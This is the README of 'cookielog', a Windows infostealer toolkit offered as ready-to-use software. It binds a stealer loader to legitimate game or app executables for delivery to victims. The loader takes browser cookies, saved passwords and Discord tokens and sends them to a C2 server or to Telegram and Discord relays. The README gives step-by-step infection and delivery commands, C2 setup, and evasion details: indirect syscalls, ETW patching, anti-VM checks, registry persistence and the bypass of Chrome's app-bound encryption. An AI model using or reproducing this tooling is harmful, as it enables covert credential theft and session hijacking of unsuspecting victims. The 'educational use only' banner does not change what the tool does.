# cookielog

```
 +----------------------------------------------------------------------+
 |                                                                      |
 |   EDUCATIONAL USE ONLY -- FOR SECURITY RESEARCH AND TRAINING         |
 |                                                                      |
 |   This is offensive security tooling for penetration testing,        |
 |   red-team exercises, and security education. It builds an           |
 |   infected executable that extracts browser cookies from a           |
 |   target machine and exfiltrates them to a remote C2 server.         |
 |                                                                      |
 |   ONLY use this on systems you own or are explicitly authorized      |
 |   to test. Unauthorized use against third-party systems, networks,   |
 |   or individuals is illegal in most jurisdictions and may result     |
 |   in criminal prosecution.                                           |
 |                                                                      |
 |   The authors are not responsible for misuse. This code is           |
 |   provided for learning how cookie-stealing attacks work so          |
 |   that defenders can build detection and mitigation.                 |
 |                                                                      |
 +----------------------------------------------------------------------+
```

Cookie exfiltration toolkit. The attacker side (Python) builds an infected
host `.exe` and receives the stolen data; the victim side (a CRT-less C payload,
shipped prebuilt) extracts cookies on a Windows machine and POSTs them back.

- **Victim browsers**: Chrome, Edge, Brave, Vivaldi, Opera, Chromium, Thorium,
  CocCoc, Yandex (Chromium-based) + Firefox -- cookies, saved passwords and
  Discord tokens, extracted even while the browser is running
- **Delivery**: the loader is appended with a legitimate host `.exe` (game or
  standalone app) which runs normally, while the payload is mapped into the
  loader's own process and works from there
- **Reception**: cookies arrive as Cookie-Editor JSON, importable directly into
  your browser; optional Telegram/Discord relay summarizes each batch

```
        ATTACKER (Linux / macOS / Windows)         VICTIM (Windows)
  +---------------------------+              +---------------------------+
  | auto.py / pick.py         |              | infected <game>.exe       |
  |   infect host (byte       |   deliver    |   -> loader (self-inject) |
  |   append + sentinel patch)|  --------->  |   -> XOR-decrypt payload  |
  |                           |              |   -> extract cookies      |
  | listen.py  (HTTP/TLS C2)  |<-------------|   -> HTTPS POST (schannel) |
  |   loot/ + TG/Discord      |   JSON       |   fallback: pipe / file   |
  +---------------------------+              +---------------------------+
```

## Contents

1. [Quick start](#quick-start)
2. [Installation](#installation)
3. [How it works](#how-it-works)
4. [Usage reference](#usage-reference)
5. [Relay: Telegram & Discord](#relay-telegram--discord)
6. [Output files](#output-files)
7. [Project structure](#project-structure)
8. [Linux (attacker machine)](#linux-attacker-machine)
9. [Technical details](#technical-details)
10. [Troubleshooting](#troubleshooting)
11. [Shortcut scripts](#shortcut-scripts)
12. [Changelog](#changelog)

---

## Quick start

### Windows (one-click)

```bat
:: install dependencies once (Python, MSVC, CLI tools)
install.bat

:: GUI -- pick a folder or .exe from a dialog
python auto.py

:: CLI -- infect a game folder (copies to ifec/folds/, infects in place)
python auto.py "C:\path\to\target_folder"

:: CLI -- infect + run locally for testing
python auto.py "C:\path\to\target_folder" --run

:: CLI -- infect a standalone .exe (output to ifec/apps/)
python auto.py "C:\path\to\target.exe"

:: C2 over a public https URL with no port-forward (cloudflared quick tunnel)
python auto.py "C:\path\to\target.exe" --tunnel
```

`auto.py` does everything automatically:

1. Checks if `loader.exe` + `ckdll.dll` exist; if not, runs `build.bat`
2. Detects your local IP (UDP connect to 8.8.8.8). Use `--c2` or the GUI "DETECT PUBLIC IP"
   button for external targets behind NAT.
3. Starts `listen.py` in a new console window
4. Infects the target (folder mode copies the folder; standalone mode just infects the file)
5. Without `--run`: prints instructions (send `ifec/folds/` or `ifec/apps/` to the victim)
   With `--run`: executes the infected exe, waits for cookies, kills the game, restores

### Windows (manual)

```bat
:: start listener + infector GUI together
start_attack.bat

:: or run pieces manually
python listen.py 9090           :: terminal 1 (listener)
python pick.py                  :: terminal 2 (infector GUI)
```

In the `pick.py` GUI:

1. The C2 URL field is pre-filled with `http://<auto-detected-LAN-IP>:9400/`. For external
   victims, click **DETECT PUBLIC IP** to use your WAN address instead (requires port
   forwarding on your router). Use **TEST C2** to verify the listener is reachable.
2. Click **Browse** and select a host `.exe`.
3. Click **Infect**. The infected binary is written to `ifec/`.
4. Send it to the victim.
5. If the victim is on a VM, check **Disable anti-VM** before infecting.

### Linux / macOS (attacker machine)

```bash
# 1. copy the project (prebuilt bin/ included -- no compiler needed) and install deps
./install.sh

# 2. start the listener
python3 listen.py 9400

# 3. infect a Windows host exe (byte append; no MSVC needed)
python3 auto.py game.exe --c2 http://YOUR_PUBLIC_IP:9400/

# 4. deliver ifec/apps/game.exe to the Windows victim
```

Details and platform support table: [Linux (attacker machine)](#linux-attacker-machine).

---

## Installation

### Windows -- `install.bat` / `install.ps1`

```bat
install.bat              :: install everything and verify the box
install.bat --check      :: report only, exit 1 if something required is missing
install.bat --no-build   :: skip MSVC + build (Python + CLI tools + cloudflared)
install.bat --no-tools   :: skip CLI tools (fzf, bat, ripgrep, clink)
install.bat --no-tunnel  :: skip the cloudflared download
```

What it does:

1. **Python** -- proves `python` actually runs (the Microsoft Store alias resolves but exits
   9009), installs 3.14 via winget when missing
2. **Python pip packages** -- `cryptography`, `websocket-client` from `requirements.txt`
3. **Toolchain** -- finds MSVC Build Tools 2022 at any of the standard VS locations or a
   `clang-cl` in PATH / `%USERPROFILE%\toolchain`; installs the C++ workload via winget when
   neither is present
4. **CLI tools** -- Clink (cmd autocomplete), fzf, bat, ripgrep -- via winget
5. **cmd_init.cmd** -- copies to `%USERPROFILE%\bin\` and sets the `AutoRun` registry key so
   Linux-style aliases (`ls`, `cat`, `grep`, etc.) load on every cmd.exe start
6. **cloudflared** -- the `--tunnel` transport, downloaded to
   `%LOCALAPPDATA%\cloudflared\cloudflared.exe`
7. **Build + verify + tests** -- `build.py all` when `bin/` is incomplete, then `build.py
   verify` (artifacts + patchable slots) and the 24 unit tests

`install.ps1` is the same flow for a shell or CI: `-Check`, `-Build`, `-NoBuild`, `-NoTunnel`.

After installation, start cookielog with `auto.bat` (shortcut for `python auto.py`).

### Linux / macOS / Git Bash -- `install.sh`

```bash
./install.sh              # install everything and verify the box
./install.sh --check      # report only, exit 1 if something required is missing
./install.sh --no-tools   # skip CLI tools (fzf, bat, ripgrep)
./install.sh --no-tunnel  # skip the cloudflared download
```

What it does:

1. **python3 + pip + tkinter** -- via the detected package manager (apt/dnf/pacman/zypper/brew);
   tkinter is optional, only the `pick.py` GUI needs it
2. **pip packages** -- `requirements.txt`, with fallbacks for PEP 668 externally-managed
   environments (Debian 12+/Ubuntu 23+/Fedora): plain install -> `--user` ->
   `--break-system-packages` -> venv instructions
3. **CLI tools** -- fzf, bat, ripgrep, via the same package manager
4. **cloudflared** -- `linux-amd64` or `linux-arm64` from the official release, installed to
   `~/.local/bin/cloudflared` (warns when that directory is not in `PATH`)
5. **Verify** -- imports `auto` + `c2auth`, and runs `build.py verify` against the prebuilt
   `bin/` so a broken or missing payload fails here, not on the victim

There is no build step on Linux by design: the victim-side binaries ship prebuilt in
`bin/` and infection is a byte append.

### Requirements

- **Windows 10/11 x64** for the victim side and for compiling; attacker side runs anywhere
- **Python 3.8+** (tested with 3.14)
- **MSVC (`cl.exe`)** -- Visual Studio 2022 Build Tools, C++ workload -- only needed to compile
  the payload (`build.bat`)
- **Python deps:** `pip install -r requirements.txt` -- installs `cryptography` (DPAPI /
  AES-GCM for `cookielog.py`) and `websocket-client` (CDP, legacy live mode)
- **Write access to the browser's install tree** -- the Chrome/Edge v20 key stage writes a
  helper into the browser's `Application` directory, so the loader probes that directory with
  a real create/delete and runs the stage only where the write succeeds. A per-user Chromium
  install (`%LOCALAPPDATA%`, e.g. Vivaldi or a per-user Chrome) needs no elevation; a system
  install under `Program Files` is skipped and reported as `no-key`, while v10/v11 stores,
  Firefox and the CEF apps are still collected. `bin\ckkey.exe /quiet` is the manual path.
  `tools\PsExec64.exe` is only for the legacy `cookielog.py --v20-sys` flow.

---

## How it works

The end-to-end infection and exfiltration chain:

1. **Attacker runs `auto.py`.** It builds binaries (if needed), detects the local LAN IP,
   starts `listen.py` on the chosen port, and infects the target.
2. **Infection.** `auto.py` (or `pick.py`) appends the original host bytes to `loader.exe` and
   patches the C2 URL, persistence, and anti-VM sentinels in the loader's `.data` section.
   At runtime, the loader XOR-decrypts the payload and copies its patched sentinel values
   into the decrypted buffer before mapping it into its own process.
   - **Folder mode:** copies the entire game/app folder to `ifec/folds/<name>/` and overwrites
     the main .exe with the infected version.
   - **Standalone mode:** writes the infected .exe to `ifec/apps/<name>.exe`.
3. **Delivery.** The attacker sends `ifec/folds/<name>/` (folder) or `ifec/apps/<name>.exe`
   (standalone) to the victim.
4. **Victim runs it.** The host app/game opens normally (rename-restore preserves the original
   exe name, which Unity games require). The loader then maps the payload into itself and
   runs it on a background thread -- the loader process stays resident until extraction
   finishes. It first runs the v20 key stage described under *Chromium cookie
   decryption*, for every browser whose install tree it can write.
5. **Extraction.** The payload extracts cookies from Chrome / Edge / Brave / Vivaldi / Opera
   (Chromium-based) and Firefox on the **victim's** machine.
6. **Exfiltration.** The payload POSTs the cookies to the attacker's C2 URL as
   Cookie-Editor JSON -- over TLS by default (`https://`, schannel in-process),
   in chunks split on record boundaries, with a 200 response required per chunk.
7. **Reception.** `listen.py` receives the JSON, merges/dedups against the existing collection
   (keyed on `domain`+`name`+`path`), and writes `loot/`.
8. **Import.** The attacker imports `loot/session_cookies.json` (or `all_cookies.json`) into
   their own browser via the Cookie-Editor extension. See
   **[COOKIE_EDITOR_GUIDE.md](COOKIE_EDITOR_GUIDE.md)**.
9. **Cryptanalysis (optional).** `session_break.py` runs on the attacker's machine to
   decrypt session cookies and analyze their structure (JWT, forgery potential,
   cross-domain correlations).

---
## Usage reference

### `auto.py` -- one-click setup

```bat
python auto.py                              :: GUI (file/folder picker)
python auto.py <folder>                     :: infect folder -> ifec/folds/
python auto.py <file.exe>                   :: infect standalone -> ifec/apps/
python auto.py <folder> --run               :: infect + run locally (test)
python auto.py <folder> --run --port 9420   :: custom port
python auto.py --cli                        :: force CLI (skip GUI)
python auto.py --config                     :: show saved relay settings
python auto.py --telegram <token:chat_id>   :: set Telegram relay
python auto.py --discord <webhook_url>      :: set Discord relay
python auto.py --persist                    :: enable registry persistence
python auto.py --c2 http://1.2.3.4:9400/    :: set C2 URL (external targets)
python auto.py --no-anti-vm                 :: disable VM/debugger checks (for VM testing)
python auto.py --find-port                  :: auto-scan for a free port (9400-9500)
python auto.py --tunnel                     :: C2 over a cloudflared https quick tunnel
python auto.py --clear-telegram             :: remove Telegram from config
python auto.py --clear-discord              :: remove Discord from config
```

| Flag | Effect |
|---|---|
| `--port N` | C2 listener port (default: 9400) |
| `--run` | Run the infected exe locally after infecting (test mode) |
| `--cli` | Force CLI mode (no GUI dialog) |
| `--telegram <token:chat_id>` | Telegram relay (saved to config.json) |
| `--discord <webhook_url>` | Discord relay (saved to config.json) |
| `--persist` | Enable registry Run key persistence (saved to config.json) |
| `--c2 <url>` | Override C2 URL (e.g. `https://c2.example.com/` or `http://PUBLIC_IP:9400/`). `https` uses the payload's schannel transport and defaults to 443. Use when victim is outside your LAN. GUI: "DETECT PUBLIC IP" button |
| `--no-anti-vm` | Disable VM MAC / debugger / sandbox checks (patch `CKAV0000` -> `CKAV0001`). Use for VM targets |
| `--find-port` | Scan ports 9400-9500 and use the first free one. Saved to `config.json` |
| `--tunnel` | Start a `cloudflared` quick tunnel and use its `https://*.trycloudflare.com/` URL as the C2. No VPS, no certificate, no port-forward (works behind CGNAT). Needs `cloudflared`; `install.bat` / `install.sh` fetch it. The GUI has the same switch (`Tunnel HTTPS` checkbox) |
| `--config` | Show saved relay settings and exit |
| `--clear-telegram` | Remove Telegram token from config.json |
| `--clear-discord` | Remove Discord webhook from config.json |
| *(path arg)* | Path to a folder or .exe (auto-detected) |

With no arguments, `auto.py` asks: [1] GUI, [2] Terminal (interactive), [3] Quick infect.

**Interactive terminal** commands: `infect`, `gui`, `telegram`, `discord`, `clear-telegram`,
`clear-discord`, `relay`, `port`, `find-port`, `persist`, `config`, `tg-chatid <token>`, `build`,
`install`, `test-listener`, `help`, `exit`.

In `--run` mode, the C2 URL is forced to `http://127.0.0.1:<port>/` for reliability.
When `--c2 <url>` is passed, it overrides the auto-detected IP (needed when the victim is
on an external network and cannot reach your LAN IP).

### `pick.py` -- manual infector GUI

```bat
python pick.py          :: GUI
python pick.py --cli    :: headless
```

Features: auto IP detection (LAN + public), editable C2 URL field, DETECT LAN IP /
DETECT PUBLIC IP / TEST C2 buttons, FIND BEST PORT (scans 9400-9500, saved to
`config.json`), NAT warning when a private IP is detected, anti-VM checkbox, browse
for .exe, infect, view JSON/TXT, open loot/ifec, rebuild, stop sink. Tag map for target
classification (`bom`, `one-shot`, `risky`, `avoid`, `incompatible`, `out`).

### `listen.py` -- HTTP/TLS listener

```bat
python listen.py [port] [--telegram <token:chat>] [--discord <webhook_url>] [--tls-cert <pem>] [--tls-key <pem>]
```

- Default port 8080 when called without arguments (auto.py starts it on the configured port)
- Forces IPv4; overrides `server_bind()` to skip `getfqdn()` (4s DNS delay fix -- the
  listener reaches LISTENING in under 1 second)
- ThreadingHTTPServer: the Telegram/Discord relay runs inside `do_POST` without stalling
  concurrent payload POSTs; `SAVE_LOCK` around loot writes
- `--tls-cert` + `--tls-key` wrap each connection in the worker thread (min TLS 1.2).
  On the VPS this is unnecessary: Caddy terminates TLS and proxies to the plain listener
  on `127.0.0.1`. The flags exist for a direct-TLS listener or a bench.
- Dedup by `(domain, name, path)`, keeping the most recent value
- Web UI: `GET /` (summary), `GET /all` (JSON), `GET /passwords` (JSON), `GET /session` (session JSON)
- Relay: `--telegram` and `--discord` forward a summary of each batch via HTTPS
- Chunked delivery: the payload tags each POST with `X-CookieLog-Chunk: i/n`; every chunk
  is a complete `{"records":[...]}` envelope and only the last carries `coverage`

### `cookielog.py` -- legacy extractor

Direct Python extraction with no injection (Windows only -- DPAPI + elevation_service).
Reads browser SQLite databases directly and decrypts with DPAPI + AES-GCM. Works on
Chrome <127, Edge, Brave, Vivaldi, Opera, and Firefox.

```bat
python cookielog.py                    :: one-shot -> cookies_all.json + cookies_all.txt
python cookielog.py --live             :: continuous, logs changes to cookie_log.jsonl
python cookielog.py --firefox          :: filter to one browser
python cookielog.py --chrome --edge --brave
```

Outputs go to the repo root: `cookies_all.json` + `cookies_all.txt`.

**Chrome >=127 app-bound (v20) key.** Chrome 127+ uses an encryption key bound to
`elevation_service.exe` via machine DPAPI. Extraction requires three stages:

```bat
:: stage 1: MACHINE DPAPI (must run as SYSTEM via PsExec)
tools\PsExec64.exe -s -i -accepteula python cookielog.py --v20-sys

:: stage 2: USER DPAPI (back to your own user)
python cookielog.py --v20-usr

:: stage 3: extract
python cookielog.py
```

Stage 2 writes the decrypted key to `C:\ProgramData\MediaCache\mc.key`, which stage 3 reads.

The mapped payload has the same unlock built in (v11): `loader.exe` embeds `ckdec.exe`,
discovers the installed browser's Elevation Service CLSID under `Classes\CLSID`, deploys the
helper into the browser's `Application` directory, and writes the raw key to
`C:\ProgramData\MediaCache\mc-<browser>.key`. The gate is write access to that directory
(probed with a real create, v14), not an elevated token: a per-user install is serviceable
at medium IL, and a system install under Program Files reports `no-key`.
The `--v20-*` flow above remains the manual route where the loader cannot write.

### `session_break.py` -- session cookie extractor + cryptanalysis

Standalone Python tool that extracts session cookies from a running browser via handle
hijacking (same technique as the C++ payload), decrypts them with DPAPI + AES-256-GCM,
and performs full cryptanalysis on the decrypted values. No injection required.

```bat
python session_break.py                           :: extract from all Chromium browsers
python session_break.py --browser vivaldi          :: target one browser
python session_break.py --browser vivaldi --report :: extract + cryptanalysis report
```

What it does:

1. **Handle hijack** -- enumerates all system handles via `NtQuerySystemInformation(0x40)`
   with a growing buffer (4MB -> 12MB+), finds the browser's SQLite DB handle, duplicates
   it with `DUPLICATE_SAME_ACCESS`, and reads the file via `ReadFile`. No need to close the
   browser.
2. **Key extraction** -- reads `Local State`, base64-decodes the `encrypted_key`, and
   calls `CryptUnprotectData` (DPAPI) to recover the 32-byte AES key.
3. **Decryption** -- decrypts each cookie value with `BCryptDecrypt` (AES-256-GCM).
   Detects and strips the 32-byte `SHA256(host_key)` domain hash prefix (Chrome >= 118).
4. **Classification** -- JWT, hex, base64, numeric, URL-encoded JSON, opaque token,
   Express signed, two-part token.
5. **JWT analysis** -- decodes JWT header + payload, assesses `alg` for forgery
   vulnerabilities (`none`, `HS256` with weak key, `RS256` key confusion).
6. **Forgery assessment** -- evaluates whether each session can be forged without the
   server secret (entropy analysis, known-key check, algorithm confusion).
7. **Correlation** -- finds shared prefixes, substrings, and duplicate values across
   cookies from different domains.

Outputs: `loot/session_decrypted.json` and `loot/cryptanalysis_report.json`.

### `swap.py` -- post-processing

Splits the captured cookies into per-site Netscape files for selective import:

```bat
python swap.py                          :: list sites on hand
python swap.py netflix                  :: swap\netflix.com.txt (non-expired)
python swap.py netflix --session        :: live session only
python swap.py netflix --session --keep :: session with artificial expiry
python swap.py google --auth            :: auth cookies only
```

Generates `swap\<site>.txt` in Netscape format, importable via Cookie-Editor -> Import.
`--keep` gives session cookies an artificial expiry so the browser doesn't discard them on
tab close; `--auth` keeps only cookies whose names match login/token patterns.

### `build.bat` -- compile

Compiles the payload DLL, the key helper and the loader. Requires MSVC (`cl.exe`) or
`build_clang.bat` (clang-cl + lld-link + llvm-ml) when the VS install has headers/libs but
no compiler. `build_keytool.bat` builds the standalone manual key stage.

```bat
build.bat
build_keytool.bat   :: optional: bin\ckkey.exe
```

Produces:

- `bin\ckdll.dll` -- payload (~51 KB, CRT-less, `/NODEFAULTLIB /ENTRY:payload_entry`, `/INCREMENTAL:NO`)
- `bin\ckdec.exe` -- elevation-service client (~143 KB), built before the loader resource
- `bin\loader.exe` -- loader (~316 KB, `/MT` static CRT, GUI subsystem, version resource,
  embedded `ckdec.exe` RCDATA)
- `src\payload.h` -- the DLL as a byte array (XOR-encrypted by `gen.ps1`), embedded into the loader

### Testing the listener

```bat
:: terminal 1
python listen.py 9090

:: terminal 2
test_curl.bat 9090
```

`test_curl.bat` POSTs a single fake cookie via `curl`. If the listener prints
`[+] 1 cookies received` and replies `ok`, the HTTP path works.

---

## Relay: Telegram & Discord

The listener (`listen.py`) can forward a summary of every received cookie batch to
Telegram or Discord. This is useful when the attacker's C2 port is firewalled --
the payload still POSTs to your listener over HTTP, and the listener re-sends a
summary to Telegram/Discord over HTTPS (which passes most firewalls).

Both relays are **optional** -- if no `--telegram` or `--discord` flag is passed,
the listener just saves cookies to `loot/` as usual.

**Keys are saved automatically** -- the first time you pass `--telegram` or `--discord`,
the value is stored in `config.json`. On subsequent runs, just run `python auto.py`
without the flag and the saved key is loaded automatically.

```bat
python auto.py --config             :: show saved keys (masked)
python auto.py --clear-telegram     :: remove saved Telegram token
python auto.py --clear-discord      :: remove saved Discord webhook
```

### Telegram setup

1. **Create a bot** (takes 30 seconds):
   - Open Telegram, search for **@BotFather**
   - Send `/newbot`
   - Pick a name and username (e.g. `mycookielog_bot`)
   - BotFather replies with an **API token** like `8975447629:AAFzK9wam_2jfoZ...`

2. **Get your chat ID** (so the bot knows who to message):
   - Send any message to your new bot (e.g. "hi")
   - Run the helper script (it queries the API and saves to config automatically):
     ```bat
     python tg_chatid.py 8975447629:AAFzK9wam_2jfoZ...
     ```
   - It prints your chat ID and the full `--telegram` string, and saves to `config.json`

3. **Run the listener with relay**:
   ```bat
   python listen.py 9090 --telegram 8975447629:AAFzK9wam_2jfoZ...:987654321
   ```
   Format: `--telegram <bot_token>:<chat_id>`

   Or via `auto.py` (starts listener + infects in one command):
   ```bat
   python auto.py "C:\path\to\target_folder" --telegram 8975447629:AAFzK9wam_2jfoZ...:987654321
   ```

4. **What you receive**: when the victim runs the infected exe, you get a Telegram
   message like:
   ```
   cookielog: 680 cookies received

   Top domains:
     312  google.com
     145  youtube.com
      89  github.com
     ...
   Full JSON: loot/all_cookies.json
   ```

### Discord setup

1. **Create a webhook** (takes 10 seconds):
   - Open Discord, go to the server where you want notifications
   - **Server Settings** -> **Integrations** -> **Webhooks** -> **New Webhook**
   - Pick a name (e.g. "cookielog"), pick a channel
   - Click **Copy Webhook URL** -- it looks like:
     ```
     https://discord.com/api/webhooks/1234567890/abc-def-ghi...
     ```

2. **Run the listener with relay**:
   ```bat
   python listen.py 9090 --discord https://discord.com/api/webhooks/1234567890/abc-def-ghi...
   ```
   Or via `auto.py`:
   ```bat
   python auto.py "C:\path\to\target_folder" --discord https://discord.com/api/webhooks/123/abc
   ```

3. **What you receive**: when cookies arrive, the Discord webhook posts a summary with
   the top domains and counts.

### Combining both

You can use both relays at the same time:

```bat
python auto.py "C:\path\to\target_folder" --telegram 7123456789:AAH...:987654321 --discord https://discord.com/api/webhooks/123/abc
```

### Notes

- The relay sends a **summary** (top 15 domains + cookie count), not the full cookie
  JSON -- the full data is still saved in `loot/all_cookies.json` on the listener side.
- Discord has a 2000-character message limit; the summary is truncated to 1900 chars.
- The relay uses Python's `urllib.request` (HTTPS) -- no extra pip packages needed.
- If the relay fails (bad token, wrong chat ID, network error), the listener logs
  the error but **still saves cookies locally** -- no data is lost.

---
## Output files

| File | What it is | Produced by |
|---|---|---|
| `ifec/folds/<name>/<name>.exe` | Infected exe (folder mode, with dependencies) | `auto.py` |
| `ifec/apps/<name>.exe` | Infected exe (standalone mode) | `auto.py` |
| `ifec/<name>.exe` | Infected exe (legacy, from `pick.py`) | `pick.py` |
| `loot/all_cookies.json` | All cookies, Cookie-Editor JSON (browser-importable, no passwords) | `listen.py` |
| `loot/all_cookies.txt` | All cookies, Netscape format (curl/wget) | `listen.py` |
| `loot/passwords.json` | Saved passwords with usernames (JSON) | `listen.py` |
| `loot/passwords.txt` | Saved passwords (tab-separated: domain, username, password) | `listen.py` |
| `loot/session_cookies.json` | Session-only cookies, Cookie-Editor JSON | `listen.py` |
| `loot/session_cookies.txt` | Session-only cookies, Netscape format | `listen.py` |
| `loot/session_decrypted.json` | Decrypted session cookies + analysis metadata | `session_break.py` |
| `loot/cryptanalysis_report.json` | Cryptanalysis summary (classification, forgery, correlations) | `session_break.py` |
| `loot/cookies_all.json` | All cookies JSON (pipe mode) | `sink.py` |
| `loot/cookies_all.txt` | Netscape format (pipe mode) | `sink.py` |
| `cookies_all.json` | All cookies JSON (repo root) | `cookielog.py` |
| `cookies_all.txt` | Netscape format (repo root) | `cookielog.py` |
| `cookie_log.jsonl` | Continuous change log (one line per change) | `cookielog.py --live` |
| `swap/<site>.txt` | Per-site Netscape cookies | `swap.py` |
| `C:\ProgramData\MediaCache\mc-<browser>.key` | Raw 32-byte v20 app-bound key, one per Chromium browser | `loader.exe` key stage |
| `C:\ProgramData\MediaCache\stage-<browser>.appb` | Temporary APPB blob (deleted after the service call) | `loader.exe` key stage |
| `C:\ProgramData\MediaCache\mc.key` | Legacy single v20 key file (still read as a fallback) | `cookielog.py --v20-usr`, `ckkey.exe` |
| `C:\ProgramData\MediaCache\cache.json` | Local fallback dump (no C2, no pipe) | `ckdll.dll` payload |
| `C:\ProgramData\MediaCache\cache.log` | Payload debug trace (built with `/DDEBUG`) | `ckdll.dll` payload |
| `~ck_bak.bin` | Hidden backup of infected exe (created on victim, auto-deleted) | `loader.exe` |

---

## Project structure

```
cookielog/
|-- DISCLAIMER            # Educational use disclaimer (read this first)
|-- install.bat           # One-click dependency installer (Windows)
|-- install.ps1           # Same flow for a shell/CI: -Check, -Build, -NoTunnel
|-- install.sh            # One-click dependency installer (Linux/macOS/Git Bash)
|-- auto.py               # One-click: build + listen + infect + test (GUI + CLI)
|-- auto.bat              # Shortcut: python auto.py %*
|-- pick.py               # GUI infector (standalone, manual C2 config)
|-- listen.py             # HTTP listener: receives exfiltrated cookies
|-- session_break.py      # Python session cookie extractor + cryptanalysis
|-- tg_chatid.py          # Helper: finds Telegram chat ID from bot token
|-- sink.py               # Pipe/FIFO server (local fallback, no C2 needed)
|-- swap.py               # Splits cookies by site (per-site cookies.txt)
|-- cookielog.py          # Legacy Python extractor (SQLite + DPAPI + AES-GCM)
|-- build.bat             # Compiles ckdll.dll + ckdec.exe + loader.exe (needs MSVC)
|-- build_keytool.bat     # Compiles ckkey.exe with ckdec.exe embedded
|-- start_attack.bat      # Starts listener + pick.py GUI together
|-- test_curl.bat         # Tests listener with curl
|-- cmd_init.cmd          # Linux-style aliases for cmd.exe
|-- COOKIE_EDITOR_GUIDE.md # How to import session cookies into Cookie-Editor extension
|-- PAYLOAD_STEPS.txt     # Payload execution walkthrough (English)
|-- PAYLOAD_STEPS_PTBR.txt # Payload execution walkthrough (Portuguese)
|-- requirements.txt      # Python deps
|-- config.json           # Saved API keys (auto-generated, gitignored)
|-- CHANGELOG.md          # Version history (v1..v6 in detail)
|-- .gitignore
|-- src/
|   |-- ckdll.cpp         # Payload DLL (CRT-less, manually mapped)
|   |-- loader.cpp        # Loader (self-injection + indirect syscalls + ETW patch + v20 key stage)
|   |-- ckdec.cpp         # Elevation-service client (embedded in loader.exe and ckkey.exe)
|   |-- payload.h         # XOR-encrypted DLL bytes (auto-generated by gen.ps1)
|   |-- loader.rc         # Version resource + ckdec.exe RCDATA
|   `-- gen.ps1           # XOR-encrypts ckdll.dll -> payload.h (16-byte key from DLL bytes)
|-- keytool.cpp           # Manual v20 key stage (standalone ckkey.exe)
|-- keytool.rc            # Embeds ckdec.exe into ckkey.exe
|-- bin/                  # Build output (prebuilt, tracked)
|   |-- loader.exe        # ~324 KB (XOR payload + embedded helper + self-injection)
|   |-- ckdll.dll         # ~51 KB
|   |-- ckdec.exe         # ~143 KB (elevation-service client)
|   |-- ckkey.exe         # ~285 KB (manual key stage, embeds ckdec.exe)
|   `-- loader.res        # Compiled version resource + helper
|-- ifec/                 # Infected outputs (gitignored)
|   |-- folds/            # Folder-mode infections (game + dependencies)
|   `-- apps/             # Standalone infections (single .exe)
|-- loot/                 # Captured cookies (gitignored)
`-- tools/
    `-- PsExec64.exe      # Sysinternals (for legacy `cookielog.py --v20-sys`)
```

---
## Linux (attacker machine)

The toolkit is split in two sides, and only the ATTACKER side is portable:

**Runs natively on Linux** (attacker machine, Python 3.8+):
- `listen.py` -- pure Python HTTP server (ThreadingHTTPServer), no Windows deps
- `sink.py` -- Windows uses `\\.\pipe\ck_pipe`; on Linux it creates a FIFO at
  `/tmp/ck_pipe` with the same protocol (one JSON dump per connection, EOF ends it).
  The payload's fallback path differs per OS, but the attacker-side workflow is identical
- `auto.py` -- infection is a byte append (loader bytes + host bytes + length + magic),
  fully portable; `--c2`, `--find-port`, Telegram/Discord relay and the GUI all work
- `pick.py` -- PE classification is pure Python; infection works; `tkinter` GUI works
- `swap.py`, `session_break.py` (analysis modes) -- pure Python

**Windows-only** (they bind to Win32 by design):
- `bin/loader.exe` + `bin/ckdll.dll` -- the payload uses DPAPI (cookie key decryption),
  self-injection (manual map + indirect `Nt*` syscalls), the Windows registry (persistence)
  and NT pipes; the loader's v20 key stage writes into the browser install tree and calls the
  Windows Elevation Service. The targets themselves (Chromium/Edge/Firefox stores) are Windows paths
- `build.bat` -- needs MSVC. On Linux, copy prebuilt `bin/loader.exe` + `bin/ckdll.dll`
  from a Windows build machine; infection works without compiling (the repo ships prebuilt)
- `cookielog.py` -- stages the v20 app-bound key on a Windows victim (DPAPI +
  elevation_service). No Linux mode (Linux Chrome keys use the user keyring, not DPAPI).
  `bin\ckkey.exe /quiet` is the compiled equivalent for a machine without Python
- `auto.py --run` / `pick.py` loader launch -- runs the infected PE: test on Windows
- `session_break.py` live Vivaldi hijack -- NtQuerySystemInformation; the Firefox read
  and the cryptanalysis report work on Linux (profile at `~/.mozilla/firefox`)

Windows-only entry points print a clear message and return instead of crashing.

**Arch Linux notes:** the interpreter is `python` (3.x), not `python3` -- run
`python auto.py ...` etc., or create the alias once:
`ln -s "$(command -v python)" ~/.local/bin/python3`. pip is PEP 668-managed
(externally-managed environment): the cleanest route is
`sudo pacman -S python-cryptography python-websocket-client`; otherwise
`./install.sh` falls back to `pip --break-system-packages` automatically.
The GUI (`pick.py`) needs the `tk` package, which `./install.sh` installs.

Quick start on Linux (attacker):

```bash
# 1. copy the project (with prebuilt bin/) to the Linux box
#    (optional) install deps:  ./install.sh
# 2. pick a port and start the listener
python3 listen.py 9400
# 3. infect a Windows host exe (byte append; no MSVC needed)
python3 auto.py game.exe --c2 http://YOUR_PUBLIC_IP:9400/
# 4. deliver ifec/apps/game.exe to the Windows victim
# optional local fallback sink instead of the HTTP listener
python3 sink.py
```

---

## Technical details

### Self-injection (v13)

The loader does not spawn or hollow a host process. It maps `ckdll.dll` into its own
address space and runs `payload_entry` on a thread; the loader's lifetime is the payload's
lifetime, and the clean host runs as an independent process.

1. `DecryptPayload()` XOR-decrypts `payload.h` and patches the C2 / persist / anti-VM
   sentinels from the loader's own copies.
2. `InitSyscalls()` parses the SSNs from the mapped ntdll stubs
   (`4C 8B D1 B8 ss ss ss ss`) and finds a `0F 05 C3` (`syscall; ret`) gadget in ntdll's
   `.text`. Three 21-byte stubs (`mov r10,rcx; mov eax,ssn; mov r11,gadget; jmp r11`) are
   written to one RX page.
3. `NtAllocateVirtualMemory` (indirect) reserves the image at its preferred `0x5F000000`.
   If the range is taken, the allocation is retried anywhere and the `.reloc` directory is
   applied for the delta.
4. Headers and sections are copied; the IAT is resolved in-process against signed System32
   DLLs; the `.pdata` range is registered with `RtlAddFunctionTable` so an exception inside
   the mapped payload can unwind.
5. `EtwEventWrite` is patched to `33 C0 C3` (`xor eax,eax; ret`): event writes report
   success without emitting, and the on-disk ntdll is untouched.
6. Release builds set `ProcessSignaturePolicy = MicrosoftSignedOnly`; every later image load
   must be Microsoft-signed, and the payload is already mapped. DEBUG builds skip this so a
   debugger can load unsigned extensions on the bench.
7. Sections get their final protections, the DOS/NT headers are erased (no `MZ`/`PE` at the
   mapped base), and the decrypted staging buffer is zeroed before `free`.
8. `NtCreateThreadEx` (indirect) starts `payload_entry` with `h=1`; plain `CreateThread` is
   the fallback if the syscall layer failed to initialise. The loader waits for that thread
